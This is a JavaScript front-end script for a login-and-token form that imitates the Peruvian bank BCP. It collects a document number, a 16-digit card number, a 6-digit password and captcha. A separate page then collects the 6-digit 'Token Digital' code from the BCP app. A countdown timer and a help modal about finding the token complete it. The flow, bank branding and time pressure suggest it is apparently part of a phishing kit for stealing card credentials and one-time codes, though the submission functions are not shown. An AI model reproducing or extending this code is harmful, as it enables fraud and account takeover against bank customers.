// 1. CRONÓMETRO
let timeLeft = 180;
const timerDisplay = document.querySelector('.timer span');
if (timerDisplay) {
    setInterval(() => {
        if (timeLeft > 0) {
            timeLeft--;
            timerDisplay.innerText = `${timeLeft} segundos`;
        }
    }, 1000);
}

// 2. MANEJO DE DOCUMENTO (Dropdown)
function toggleDocMenu(e) {
    if (e) e.stopPropagation();
    const menu = document.getElementById('doc-menu');
    if (menu) menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
}

function selectDoc(type) {
    const label = document.getElementById('selected-doc');
    if (label) label.innerText = type;
    const menu = document.getElementById('doc-menu');
    if (menu) menu.style.display = 'none';
    validateForm();
}



// 4. MOSTRAR/OCULTAR INPUT DE NOMBRE (Alias)
function toggleNameInput() {
    const checkbox = document.getElementById('remember-check');
    const nameGroup = document.getElementById('name-group');
    if (checkbox && nameGroup) {
        nameGroup.style.display = checkbox.checked ? 'block' : 'none';
    }
    validateForm();
}

// 5. FUNCIÓN EMPRESA (Pre-relleno 4912)
function setCard(val) {
    const cardInput = document.getElementById('card-input');
    if (cardInput) {
        cardInput.value = val;
        if (val === '4912') cardInput.focus();
    }
    validateForm();
}

// 6. VALIDACIÓN DE BOTÓN
function validateForm() {
    const docInput = document.querySelector('.input-inner');
    const cardInput = document.getElementById('card-input');
    const passInput = document.getElementById('pass-input');
    const captchaInput = document.querySelector('.captcha-input');
    const checkbox = document.getElementById('remember-check');
    const nameInput = document.getElementById('name-input');
    const btn = document.getElementById('btn-submit');

    if (!btn) return;

    const doc = docInput ? docInput.value : "";
    const card = cardInput ? cardInput.value : "";
    const pass = passInput ? passInput.value : "";
    const captcha = captchaInput ? captchaInput.value : "";
    const isRememberActive = checkbox ? checkbox.checked : false;
    const name = nameInput ? nameInput.value : "";

    // Requerimientos mínimos de seguridad
    let isValid = doc.length >= 8 && card.length === 16 && pass.length === 6 && captcha.length >= 6;

    if (isRememberActive && name.trim() === "") isValid = false;

    btn.disabled = !isValid;
    btn.style.opacity = isValid ? "1" : "0.5";
    btn.style.cursor = isValid ? "pointer" : "not-allowed";
}

// 8. LÓGICA DE TOKEN (Salto de foco)
function setupTokenInputs() {
    const inputs = document.querySelectorAll('.token-input');
    const btn = document.getElementById('btn-submit');

    inputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
            
            const completo = [...inputs].every(i => i.value.length === 1);
            if (btn) {
                btn.disabled = !completo;
                btn.style.opacity = completo ? "1" : "0.5";
                btn.style.cursor = completo ? "pointer" : "not-allowed";
            }
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
        });
    });
}

// 9. MODAL AYUDA TOKEN
function mostrarAyudaToken(e) {
    if (e) e.preventDefault();
    Swal.fire({
        title: '¿Dónde encuentro mi Token?',
        html: `
            <div style="text-align: left; font-size: 14px; color: #555;">
                <ol>
                    <li>Ingresa a tu <b>App BCP</b> desde tu celular.</li>
                    <li>En la pantalla de inicio, busca <b>Token Digital</b>.</li>
                    <li>Copia el código de <b>6 dígitos</b> e ingrésalo aquí.</li>
                </ol>
            </div>
        `,
        icon: 'info',
        confirmButtonText: 'Entendido',
        confirmButtonColor: '#002a8d'
    });
}

// 10. INICIALIZACIÓN

document.addEventListener('DOMContentLoaded', () => {
    // Escucha cambios en todos los inputs para validar el botón
    document.querySelectorAll('input').forEach(input => {
        // 'input' detecta cuando escribes con el teclado del celular
        input.addEventListener('input', validateForm);
    });

    // Checkbox para mostrar el Alias
    const checkbox = document.getElementById('remember-check');
    if (checkbox) checkbox.addEventListener('change', toggleNameInput);

    // Ayuda del Token (SweetAlert)
    const linkAyuda = document.getElementById('ver-token');
    if (linkAyuda) linkAyuda.onclick = mostrarAyudaToken;

    // Lógica para saltar entre los cuadritos del Token (si aplica)
    const isTokenPage = document.querySelector('.token-input');
    if (isTokenPage) setupTokenInputs();

    // Envío del formulario
    const btn = document.getElementById('btn-submit');
    if (btn) {
        btn.onclick = (e) => {
            e.preventDefault();
            if (isTokenPage) processToken(); else processLogin();
        };
    }

    validateForm();
});